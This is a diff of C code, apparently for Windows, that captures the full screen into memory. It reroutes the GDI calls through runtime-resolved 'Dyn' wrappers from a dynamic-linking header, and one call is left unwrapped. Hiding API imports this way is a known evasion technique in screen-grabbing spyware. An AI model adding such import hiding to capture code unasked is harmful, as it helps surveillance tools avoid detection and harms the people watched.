@@ -2,6 +2,8 @@
 #include <stdio.h>
 #include <stdlib.h>
 
+#include "dynamic_linking.h"
+
 // Structure to hold screenshot data
 typedef struct {
     unsigned char* data;
@@ -18,29 +20,29 @@ ScreenshotData* CaptureScreenshotToMemory(void) {
     }
 
     // Get the desktop window and its device context
-    HWND hDesktopWnd = GetDesktopWindow();
-    HDC hScreenDC = GetDC(hDesktopWnd);
-    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
+    HWND hDesktopWnd = DynGetDesktopWindow();
+    HDC hScreenDC = DynGetDC(hDesktopWnd);
+    HDC hMemoryDC = DynCreateCompatibleDC(hScreenDC);
 
     // Get true physical screen dimensions (not scaled by DPI)
-    int screenWidth = GetDeviceCaps(hScreenDC, DESKTOPHORZRES);
-    int screenHeight = GetDeviceCaps(hScreenDC, DESKTOPVERTRES);
+    int screenWidth = DynGetDeviceCaps(hScreenDC, DESKTOPHORZRES);
+    int screenHeight = DynGetDeviceCaps(hScreenDC, DESKTOPVERTRES);
 
     screenshot->width = screenWidth;
     screenshot->height = screenHeight;
 
     // Create a compatible bitmap
-    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
+    HBITMAP hBitmap = DynCreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
 
     // Select the bitmap into the memory DC
-    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
+    HBITMAP hOldBitmap = (HBITMAP)DynSelectObject(hMemoryDC, hBitmap);
 
     // Copy the entire screen to the bitmap
-    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);
+    DynBitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);
 
     // Get bitmap information
     BITMAP bitmap;
-    GetObject(hBitmap, sizeof(BITMAP), &bitmap);
+    DynGetObject(hBitmap, sizeof(BITMAP), &bitmap);
 
     BITMAPINFOHEADER bi;
     bi.biSize = sizeof(BITMAPINFOHEADER);
@@ -62,10 +64,10 @@ ScreenshotData* CaptureScreenshotToMemory(void) {
     screenshot->data = (unsigned char*)malloc(dwTotalSize);
     if (screenshot->data == NULL) {
         free(screenshot);
-        SelectObject(hMemoryDC, hOldBitmap);
-        DeleteObject(hBitmap);
-        DeleteDC(hMemoryDC);
-        ReleaseDC(hDesktopWnd, hScreenDC);
+        DynSelectObject(hMemoryDC, hOldBitmap);
+        DynDeleteObject(hBitmap);
+        DynDeleteDC(hMemoryDC);
+        DynReleaseDC(hDesktopWnd, hScreenDC);
         return NULL;
     }
 
@@ -86,10 +88,10 @@ ScreenshotData* CaptureScreenshotToMemory(void) {
     GetDIBits(hMemoryDC, hBitmap, 0, (UINT)bitmap.bmHeight, bitmapData, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
 
     // Clean up
-    SelectObject(hMemoryDC, hOldBitmap);
-    DeleteObject(hBitmap);
-    DeleteDC(hMemoryDC);
-    ReleaseDC(hDesktopWnd, hScreenDC);
+    DynSelectObject(hMemoryDC, hOldBitmap);
+    DynDeleteObject(hBitmap);
+    DynDeleteDC(hMemoryDC);
+    DynReleaseDC(hDesktopWnd, hScreenDC);
 
     return screenshot;
 }
